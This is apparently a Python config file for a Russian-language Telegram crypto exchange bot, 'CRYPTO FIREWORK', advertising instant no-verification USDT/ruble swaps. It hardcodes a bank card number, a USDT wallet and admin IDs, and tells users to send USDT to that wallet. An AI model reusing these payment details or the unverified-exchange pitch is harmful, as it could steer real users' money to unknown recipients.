import os

CARD = os.getenv("CARD", "2200702171069789")
BANK = os.getenv("BANK", "Т-Банк")
USDT_WALLET = os.getenv("USDT_WALLET", "TDBbi3P3tqmsRDrGfkyzJR5x9Z5Lpzjv6L")
SUPPORT_URL = os.getenv("SUPPORT_URL", "https://t.me/SupCryptoFireWork")
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "872151895,6593438966").split(",")]

START_TEXT = """💎 <b>CRYPTO FIREWORK</b>

Мгновенный обмен криптовалют.

🔄 <b>Курс:</b>
• USDT → 70₽ (продажа)
• RUB → 75₽ (покупка)

💰 Лучший курс на рынке!
⚡ Мгновенные выплаты
🔐 Без верификации"""

SELL_CRYPTO_TEXT = """💰 <b>ПРОДАТЬ КРИПТУ</b>

Мы покупаем USDT по выгодному курсу!

Курс: 1 USDT = 70₽

Отправьте USDT на кошелёк:
<code>{wallet}</code>

Сеть: TRC20

После отправки нажмите «Я ОТПРАВИЛ»"""

ADMIN_TEXT = """👑 <b>CRYPTO FIREWORK ADMIN</b>

👥 Юзеров: {users}
💎 Транзакций: {transactions}
💰 Доход: {revenue}₽"""
